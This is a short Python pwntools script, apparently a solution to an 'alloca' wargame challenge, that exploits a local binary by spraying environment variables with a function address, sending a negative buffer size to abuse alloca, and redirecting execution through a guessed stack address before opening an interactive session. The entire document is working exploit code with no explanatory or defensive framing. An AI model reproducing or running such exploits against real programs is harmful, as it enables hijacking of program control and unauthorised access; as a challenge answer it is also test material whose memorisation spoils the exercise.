from pwn import *


class AllocaExploit(object):
    BUFFER_SIZE = -76
    CALLME_ADDRESS = 0x080485AB
    RANDOM_STACK_ADDRESS = 0xffb86f6f

    def __init__(self):
        self.process = process(executable="/home/alloca/alloca",
                               argv=["/home/alloca/alloca"],
                               env={str(i): p32(self.CALLME_ADDRESS) * 30000 for i in range(15)})

    def run(self):
        self.process.sendline(str(self.BUFFER_SIZE))
        self.process.sendline(str(self.RANDOM_STACK_ADDRESS - 0xffffffff))
        self.process.interactive()


if __name__ == '__main__':
    AllocaExploit().run()
